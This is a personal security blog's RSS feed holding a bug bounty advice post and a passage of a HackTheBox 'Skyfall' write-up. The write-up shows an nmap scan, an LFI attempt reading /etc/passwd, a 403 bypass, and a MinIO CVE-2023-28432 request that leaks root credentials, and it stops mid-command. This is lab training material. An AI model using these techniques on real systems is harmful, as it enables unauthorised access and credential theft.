<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Cecil Daemon&apos;s Wish</title>
    <description>Personal hacker&apos;s blog</description>
    <link>http://localhost:4000</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml" />
    <author>
      <name>J. Alex Buschinelli</name>
      <email>buschinellijoao@gmail.com</email>
      <uri>https://alexbsec.github.io/</uri>
    </author>
    
      <item>
        <title>Bug Bounty Tips</title>
        <description>&lt;p&gt;Hi folks! It’s been a while, hasn’t it?&lt;/p&gt;

&lt;p&gt;First and foremost, I’ve not been that active here these past two months because I decided to focus myself on Bug Bounties rather than CTFs, at least for now. Differently from CTFs, I cannot disclose every Bug I find on Bug Bounties, so that’s why the blog has been a bit quiet. For that, I’m sorry! However, don’t go thinking I’m never going to post anymore! In fact, there are some CVEs on the way that I intend on posting, and even some snippets on what I’ve been up to.&lt;/p&gt;

&lt;p&gt;Transitioning to our main topic today, I realize that my shift towards Bug Bounties has sparked curiosity and raised questions among many of you. Lately, I’ve been inundated with messages on LinkedIn, with many of you asking, &lt;em&gt;“Hey! How did you start doing bug bounties? Can you help me?”&lt;/em&gt; or expressing concerns like, &lt;em&gt;“I’m starting out hunting but have not found anything so far. Should I give up?”&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Given the volume of inquiries and the impracticality of responding to each one individually, I’ve decided to dedicate this post to shedding light on my journey into Bug Bounties.&lt;/p&gt;

&lt;h1 id=&quot;the-beginning&quot;&gt;The beginning&lt;/h1&gt;

&lt;p&gt;Thinking back a little, I recall the first time I heard about Bug Bounties was during my high school years. Of course, that wasn’t when I actually started participating in them, but it’s always insightful to trace back to our initial encounters with anything. It was only on 2022 I decided to shift my career from being a Physicist into a Cybersecurity enthusiast and Bug Hunter. The reason behind that? This is a topic for another post!&lt;/p&gt;

&lt;p&gt;My very first foray into participating in a Bug Bounty Program was through HackerOne, which, for those who might not be familiar, stands as one of the most prestigious Bug Bounty platforms in the cyber realm. I took my inaugural plunge with a bank (whose name escapes me now), where I stumbled upon what I believed was an open redirect and eagerly reported it. Truth be told, at that time, my skills were quite nascent, and my report was swiftly closed due to lack of impact.&lt;/p&gt;

&lt;p&gt;This initial and rather significant rejection came in August 2022, prompting me to take a step back and reassess my stance on the chessboard. It became clear that I wasn’t yet equipped to dive into such programs, especially one associated with a bank — the one niche that might be reputed with the best security standards. Because of that, I began to diligently build my skills from scratch.&lt;/p&gt;

&lt;h2 id=&quot;the-material&quot;&gt;The material&lt;/h2&gt;

&lt;p&gt;Like many newcomers to the cybersecurity scene, I found myself swamped by an avalanche of information about the field. I encountered numerous paid online courses, for which I regretfully shelled out money, only to learn nothing — either due to the courses being scams or simply lacking in effective teaching methods. Yet, not everything was in vain, as among these attempts, I discovered the renowned online web hacking practice lab, &lt;a href=&quot;https://portswigger.net&quot;&gt;Portswigger&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;If this is unfamiliar to you, picture Portswigger as a website that invites you to hack into it, without any risk of harm or legal repercussions. It’s crafted to mimic a wide array of web vulnerabilities and the techniques to exploit them, making it an incredibly user-friendly platform. Plus, it boasts a vast community, ensuring that if you ever find yourself puzzled by one of their labs, help is readily available online. Can’t recommend it enough. Nowadays, it even includes learning sections, allowing you to grasp the concepts before getting your hands dirty.&lt;/p&gt;

&lt;p&gt;I decided to complete at least all beginner level labs before coming back to Bug Bounties. And that’s what I did! Of course, at first I could only solve the labs with a solution sitting right beside me. So my strategy was the following:&lt;/p&gt;

&lt;div style=&quot;display: flex; justify-content: center; align-items: center;&quot;&gt;
&lt;img src=&quot;../assets/bbounty-mermaid.png&quot; alt=&quot;flow chart&quot; /&gt;
&lt;/div&gt;

&lt;p&gt;To be honest, this strategy is the one I use to this day whenever I want to solve something I can’t without a solution.&lt;/p&gt;

&lt;h2 id=&quot;the-comeback&quot;&gt;The comeback&lt;/h2&gt;

&lt;p&gt;After completing all the easy level labs, I decided to return to hunting. That’s when I discovered my first ever vulnerability. And guess where I found it? On Portswigger’s own website! However, it wasn’t in the labs; I identified an actual vulnerability within their website. Funny enough, it was another open redirect. This time, however, I paused to consider: how could I report this and demonstrate its impact effectively? My initial attempt had been rejected due to a lack of demonstrated impact. This is the moment you often hear hackers mention the importance of thinking outside the box. So after some days I found a way to showcase how one could leverage that into information disclosure via an SSRF (Server Side Request Forgery) and decided to report it.&lt;/p&gt;

&lt;p&gt;I wrote an e-mail to their support team and… You guessed it right! The next day they got it solved and fixed!&lt;/p&gt;

&lt;h1 id=&quot;the-grind&quot;&gt;The grind&lt;/h1&gt;

&lt;p&gt;I’d strongly recommend to all you readers: practice makes perfect. I’ve always been a curious person, so I discovered a variety of websites offering cybersecurity labs for practice. &lt;a href=&quot;https://pwnable.kr&quot;&gt;Pwnable&lt;/a&gt; is one such example, and so is &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt;. The former is particularly challenging, as solutions are not readily available online, and many of their challenges involve binary exploitation, system privilege escalation, and reverse engineering — concepts not covered by Portswigger, for instance. Root-me is another excellent resource that offers a wide range of labs, from binary to web exploitation, though solutions are even more scarce than on Pwnable.&lt;/p&gt;

&lt;p&gt;I also recommend &lt;a href=&quot;https://www.hacker101.com/&quot;&gt;Hacker101&lt;/a&gt;, HackerOne’s own practice lab website. It is great because as you solve them you earn points. With enough points, you can be called to a private program, where the competition is way smaller. This is what actually happened to me. After solving a bunch of these, I got called to check Latam Airlines and Sephora’s VDP programs. I could report one or two vulns there as well, but nothing too impactful.&lt;/p&gt;

&lt;p&gt;Finally, I must mention &lt;a href=&quot;https://tryhackme.com/&quot;&gt;TryHackMe&lt;/a&gt; and &lt;a href=&quot;https://www.hackthebox.com/&quot;&gt;HackTheBox&lt;/a&gt; as one of the best learning resources out there. They have excellent study material and amazing labs to be solved, ranging from super easy ones up to almost impossible Dark Souls like ones.&lt;/p&gt;

&lt;h2 id=&quot;bug-bounty-platforms&quot;&gt;Bug Bounty Platforms&lt;/h2&gt;

&lt;p&gt;When it comes to choosing platforms, I strongly suggest opting for less competitive ones to avoid feeling overwhelmed and frustrated by reporting duplicates or not finding any vulnerabilities. My approach is always consistent: I select a program that appeals to me both in terms of potential earnings and features, then dedicate at least 15 days to thorough research and reconnaissance before starting another 15 days of testing. If I don’t find anything during this time, I move on to another program. The lack of findings could be due to a lack of motivation or excessive competition. You never know. By allocating time to understand the program and get a feel for it, you can confidently decide whether you’re on the right track. HackerOne and &lt;a href=&quot;https://www.bugcrowd.com/&quot;&gt;Bugcrowd&lt;/a&gt; are well-known platforms, which might be advantageous in terms of payouts but can sometimes be too competitive, leading to fewer vulnerabilities found.&lt;/p&gt;

&lt;p&gt;I might be spoiling it, but I strongly recommed you take a look at &lt;a href=&quot;https://yogosha.com&quot;&gt;Yogosha&lt;/a&gt;; it’s a platform that requires you to sign up to participate, complete a CTF, and pass. If you pass, they grant you access, and the competition is much lower than on other big platforms like HackerOne and Bugcrowd. You might also want to check out &lt;a href=&quot;https://huntr.dev&quot;&gt;HuntrDev&lt;/a&gt;. This platform is focused on finding bugs in machine learning projects and usually involves code review, which makes things a bit easier. As an honorable mention, if you’d like to get paid in euros, you can check &lt;a href=&quot;https://www.intigriti.com/&quot;&gt;Intigriti&lt;/a&gt; Bug Bounty Platform. It offers a good balance between competitiveness and payouts.&lt;/p&gt;

&lt;h2 id=&quot;vulns-found&quot;&gt;Vulns found&lt;/h2&gt;

&lt;p&gt;I found a wide range of vulnerabilities, some by myself, others colabing with friends. Among the most critical findings were a Remote Code Execution (RCE) vulnerability in an open-source project, a SQL injection that led to a database dump, and session hijacking facilitated by stolen cookies. I never concentrate on the low-hanging fruits; instead, my strategy is to always look for ways to pivot and amplify the impact of my findings.&lt;/p&gt;

&lt;h2 id=&quot;methodology&quot;&gt;Methodology&lt;/h2&gt;

&lt;p&gt;Everyone develops their own methodology for bug hunting. Personally, I prefer manual exploitation because it has yielded the best results for me. Manual methods allow for a deeper understanding of vulnerabilities and their nuances. While I’ve observed others successfully employ automation — and it does have its benefits, especially for covering a broader surface area quickly — it ultimately boils down to what strategy resonates most with your style of hunting. Finding the approach that best represents your way of thinking and exploring is what will make you see results.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;In wrapping up, here are my parting words of wisdom: once you’ve gotten a handle on a specific vulnerability, dedicate yourself to the reconnaissance and research phase. I cannot stress enough how this is important, as a deep understanding of your target can significantly streamline the exploitation process. Launching into attempts without a clear strategy or understanding seldom yields fruitful results. Prioritize reconnaissance, and keep your spirits high—even if you don’t strike gold within the first 15 days or even a month. My own experience has seen peaks of discovering multiple vulnerabilities within a single week, contrasted with dry spells stretching over months.&lt;/p&gt;

&lt;p&gt;And, if there’s one piece of advice to highlight above all, it’s the importance of persistence. Commit to spending at least 10 to 15 days on reconnaissance and testing straightforward tasks on your target. This dedicated period of exploration and understanding lays the groundwork for more effectively identifying and connecting vulnerabilities. Remember, mastering the art of bug hunting is a marathon, not a sprint. Resilience in the face of challenges and patience in your process are your greatest allies.&lt;/p&gt;

&lt;p&gt;And what about your experience? DM me with yours and we might even be able to colab!&lt;/p&gt;

&lt;p&gt;I wish you all happy hacking!&lt;/p&gt;

&lt;p&gt;And as always, don’t forget to do your &lt;strong&gt;research&lt;/strong&gt;!&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 20 Mar 2024 00:00:00 -0300</pubDate>
        <link>http://localhost:4000//bug-bounty-tips</link>
        <link href="http://localhost:4000/bug-bounty-tips"/>
        <guid isPermaLink="true">http://localhost:4000/bug-bounty-tips</guid>
      </item>
    
      <item>
        <title>Skyfall - HackTheBox</title>
        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;

&lt;p&gt;In today’s post you will find a solution write-up to the HackTheBox machine Skyfall. Let’s get to action?&lt;/p&gt;

&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;

&lt;p&gt;For our approach mindset, we shall separate it as the following steps:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;Reconnaissance&lt;/li&gt;
  &lt;li&gt;Getting foothold&lt;/li&gt;
  &lt;li&gt;System enumeration / Privilege Escalation&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;step-1---reconnaissance&quot;&gt;&lt;a href=&quot;#step1-recon&quot;&gt;&lt;/a&gt;Step 1 - Reconnaissance&lt;/h2&gt;

&lt;p&gt;As always, we shall start the enumerating open ports with Nmap:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 1000 &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-oA&lt;/span&gt; nmap/initial 10.129.78.160
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.78.160
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.13s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;reset&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssh-hostkey: 
|   256 65:70:f7:12:47:07:3a:88:8e:27:e9:cb:44:5d:10:fb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_  256 74:48:33:07:b7:88:9d:32:0e:3b:ec:16:aa:b4:c8:fe &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
80/tcp open  http    nginx 1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-server-header: nginx/1.18.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
|_http-title: Skyfall - Introducing Sky Storage!
No exact OS matches &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;host &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
TCP/IP fingerprint:
OS:SCAN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;7.94%E&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4%D&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2/4%OT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;22%CT&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%CU&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;44376%PV&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2%DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;T%G&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%TM&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;65BF912F
OS:%P&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;x86_64-pc-linux-gnu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;SEQ&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;108%GCD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1%ISR&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;109%TI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%CI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%II&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;I%TS&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;OPS&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
OS:O1&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CNNT11NW7%O4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11NW7%O5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11
OS:NW7%O6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CST11&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;WIN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;W1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W2&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W3&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W4&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W5&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88%W6&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FE88&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;ECN&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;
OS:R&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;FAF0%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;M53CNNSNW7%CC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;O%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AS
OS:%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T3&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;T4&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T5&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;A%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:R%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;T7&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%W&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%S&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Z%A&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;S+%F&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;AR%O&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;%RD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%Q&lt;span class=&quot;o&quot;&gt;=)&lt;/span&gt;U1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DF&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T
OS:&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%IPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164%UN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0%RIPL&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RID&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RIPCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUCK&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G%RUD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;G&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;IE&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Y%DFI&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;N%T&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;40%CD&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;
OS:S&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Network Distance: 2 hops
Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;using port 80/tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
HOP RTT       ADDRESS
1   129.73 ms 10.10.14.1
2   129.85 ms 10.129.78.160

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Nmap done at Sun Feb  4 13:29:19 2024 -- 1 IP address (1 host up) scanned in 104.10 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The only open port available to us right now is port 80, which contains the following web service:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall1.png&quot; alt=&quot;skyfall homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After scrolling down, we find a link to http://demo.skyfall.htb. In order to make this accessible, we need to add this domain to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. We do this by simply opening Vim as root, and appending to the last line &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; skyfall.htb demo.skyfall.htb&lt;/code&gt;. Now we are able to access this virtual host:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall2.png&quot; alt=&quot;demo skyfall login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This login page directly tells us a pair of credentials: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest:guest&lt;/code&gt;. Upon accessing it as guest, we arrive at this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall3.png&quot; alt=&quot;demo skyfall dashboard&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This panel, despite being equipped with a variety of functionalities including file uploads and a URL fetcher, does not exhibit any apparent vulnerabilities. I’ve also tried to enumerate it with gobuster, but nothing was found.&lt;/p&gt;

&lt;p&gt;After that, I decided to use BurpSuite and understand what was happening under the hood. I realized that when we pass a random string to the URL fetcher like below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall4.png&quot; alt=&quot;url fetcher functionality&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We get a pop up response at the bottom right corner of the page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall5.png&quot; alt=&quot;error messsage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we try to fetch the own Skyfall website URL http://demo.skyfall.htb, we get this message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall6.png&quot; alt=&quot;error disclosure&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Indicating a simple name resolution error. After attempting other SSRF payloads, I got nowhere.&lt;/p&gt;

&lt;p&gt;Next I analyzed the download functionality at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/files&lt;/code&gt; endpoint. Intercepting the request with Burp, we can find the following:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall7.png&quot; alt=&quot;burp download intercept&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We could try a LFI here by passing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to the filename URL parameter. This gives us:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall8.png&quot; alt=&quot;S3 disclosure&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This indicates there is a connection to some kind of cloud storage bucket. We can see that this storage might be MinIO, as we can see it on the navbar. If we click the MinIO metrics, we get a 403:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall9.png&quot; alt=&quot;metrics 403&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A simple 403 bypass worked to reveal the information of this page:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall10.png&quot; alt=&quot;metrics 403&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the bottom of these metrics, we find another endpoint:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall11.png&quot; alt=&quot;production endpoint&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After adding it to our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file and accessing it, we get a 403 response, which cannot be simply bypassed as we did with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/metric&lt;/code&gt; endpoint.&lt;/p&gt;

&lt;p&gt;With a simple google search, I was able to find &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-28432&quot;&gt;this&lt;/a&gt; CVE which worked. This CVE references information disclosure vulnerability in MinIO’s endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://prd23-s3-backend.skyfall.htb/minio/bootstrap/v1/verify&lt;/code&gt;, which is another 403 bypass. Following &lt;a href=&quot;https://www.pingsafe.com/blog/cve-2023-28432-minio-information-disclosure-vulnerability/&quot;&gt;this&lt;/a&gt; article, we see that changing the request method from GET to POST leaks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_PASSWORD&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MINIO_ROOT_USER&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../figs/skyfall12.png&quot; alt=&quot;leaked info&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, I took a step back and started reading MinIO’s documentation. I could find that there is a way to communicate with MinIO through a CLI interface. There is a command to interactively work with the S3 storage from the terminal with MinIO Client &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mc&lt;/code&gt;. We can check it how to use it &lt;a href=&quot;https://min.io/docs/minio/linux/reference/minio-mc.html&quot;&gt;here&lt;/a&gt;. To install MinIO Client CLI, we run the following command in Linux:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl https://dl.min.io/client/mc/release/linux-amd64/mc &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;--create-dirs&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/minio-binaries/mc

